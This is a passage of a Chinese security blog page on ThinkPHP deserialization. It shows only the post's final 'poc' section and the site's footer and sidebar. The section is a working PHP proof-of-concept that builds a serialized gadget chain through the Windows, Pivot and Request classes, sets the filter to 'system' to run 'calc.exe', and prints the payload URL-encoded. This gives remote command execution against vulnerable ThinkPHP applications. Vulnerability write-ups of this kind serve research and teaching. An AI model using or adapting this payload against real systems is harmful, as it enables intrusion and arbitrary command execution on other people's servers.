+<h3 id="poc"><a href="/2025/05/08/ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think;</span><br><span class="line">abstract class Model{</span><br><span class="line">    protected $append = [];</span><br><span class="line">    private $data = [];</span><br><span class="line">    function __construct(){</span><br><span class="line">        $this-&gt;append = ["ethan"=&gt;["calc.exe","calc"]];</span><br><span class="line">        $this-&gt;data = ["ethan"=&gt;new Request()];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">class Request</span><br><span class="line">{</span><br><span class="line">    protected $hook = [];</span><br><span class="line">    protected $filter = "system";</span><br><span class="line">    protected $config = [</span><br><span class="line">        // 表单请求类型伪装变量</span><br><span class="line">        'var_method'       =&gt; '_method',</span><br><span class="line">        // 表单ajax伪装变量</span><br><span class="line">        'var_ajax'         =&gt; '_ajax',</span><br><span class="line">        // 表单pjax伪装变量</span><br><span class="line">        'var_pjax'         =&gt; '_pjax',</span><br><span class="line">        // PATHINFO变量名 用于兼容模式</span><br><span class="line">        'var_pathinfo'     =&gt; 's',</span><br><span class="line">        // 兼容PATH_INFO获取</span><br><span class="line">        'pathinfo_fetch'   =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],</span><br><span class="line">        // 默认全局过滤方法 用逗号分隔多个</span><br><span class="line">        'default_filter'   =&gt; '',</span><br><span class="line">        // 域名根，如thinkphp.cn</span><br><span class="line">        'url_domain_root'  =&gt; '',</span><br><span class="line">        // HTTPS代理标识</span><br><span class="line">        'https_agent_name' =&gt; '',</span><br><span class="line">        // IP代理获取标识</span><br><span class="line">        'http_agent_ip'    =&gt; 'HTTP_X_REAL_IP',</span><br><span class="line">        // URL伪静态后缀</span><br><span class="line">        'url_html_suffix'  =&gt; 'html',</span><br><span class="line">    ];</span><br><span class="line">    function __construct(){</span><br><span class="line">        $this-&gt;filter = "system";</span><br><span class="line">        $this-&gt;config = ["var_ajax"=&gt;''];</span><br><span class="line">        $this-&gt;hook = ["visible"=&gt;[$this,"isAjax"]];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\concern\Conversion;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Windows</span><br><span class="line">{</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;files=[new Pivot()];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">{</span><br><span class="line">}</span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">echo urlencode(serialize(new Windows()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>头脑风暴！</p>
+</body></html>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/" rel="prev" title="绕过disable_function的限制">
+      <i class="fa fa-chevron-left"></i> 绕过disable_function的限制
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">ThinkPhp框架反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%B8%B8%E8%A7%81%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="nav-number">1.0.1.</span> <span class="nav-text">反序列化的常见的知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%86%E6%9E%90"><span class="nav-number">1.0.2.</span> <span class="nav-text">Thinkphp反序列化的分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc"><span class="nav-number">1.0.3.</span> <span class="nav-text">poc</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Cnext</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/admintor889" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;admintor889" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cnext</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>-->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
